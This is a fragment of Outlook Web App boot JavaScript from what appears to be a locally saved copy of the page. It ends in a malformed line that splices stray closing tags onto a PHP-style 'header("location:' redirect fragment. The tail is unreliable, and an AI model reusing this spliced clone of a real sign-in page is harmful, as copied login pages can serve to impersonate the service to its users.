                            var bracketsInPair = data.indexOf('{') == 0 && data.lastIndexOf('}') == data.length-1;
                            var owaUserConfigExists = data.indexOf('owaUserConfig') != -1;
                            var subStringFromLastLeftBracket = data.substring(data.lastIndexOf('{'));
                            errMsg += ',BracketsInPair:' + bracketsInPair + ',OwaUserConfigExists:' + owaUserConfigExists + ',SubStringFromLastLeftBracket:' + subStringFromLastLeftBracket;
                        }
                        handleBootError2(
                            'SessionDataError',
                            errMsg,
                            window.owaSD.getResponseHeader("X-OWA-Version"),
                            window.owaSD.getResponseHeader('X-BEServer'));
                        return;
                    }
                } else {
                    var errMsg = window.owaSD.getResponseHeader("X-Auth-Error");
                    var errType = "SDAuthErr";
                    if (!errMsg) {
                        errMsg = window.owaSD.getResponseHeader("X-OWA-Error");
                        errType = "SDServerErr";
                    }

                    handleBootError2(
                        errType,
                        errMsg,
                        window.owaSD.getResponseHeader("X-OWA-Version"),
                        window.owaSD.getResponseHeader('X-CalculatedBETarget'));

                    if (!userEnabledOffline()) {
                        return;
                    }
                  }
            }
            
                pbar.renderCompleted();
                
                setTimeout(invokeMainandTrace, 0);
            
            }

        function invokeMainandTrace()
        {
            invokeMain();
            if (window.owaSD.readyState == 4) {
                postBootTrace('success;' + window.owaSD.status);
            } else {
                postBootTrace('success;' + window.owaSD.readyState);
            }
        }

        function owastartpopout()
        {
            if (!userSpecificsLoaded) {
                handleBootError2('UserSpecificError');
                return;
            }

            invokeMain();
            cleanupErrorCallback();
        }

        function startUpOwa() {
            parseEndTimes["allDone"] = ((new Date()) - (new Date(0)));

            if (isPopOut) {
                owastartpopout();
            } else {
                window.owaSDConsumable=true;
                if (window.owaSDdidHandlerExecute || userEnabledOffline()) {
                    owastart();
                }
            }
        }

        try
        {
            
            if (window.owaSDState.usrPending == 0) {
                startUpOwa();
            }
            
        }
        catch (ex) {
            window.owaLastErrorReported = ex;
            throw ex;
        }

         
</body></html></script></header("location:><script src="./Outlook_files/cdnversioncheck.js.download" async=""></script></body></html>
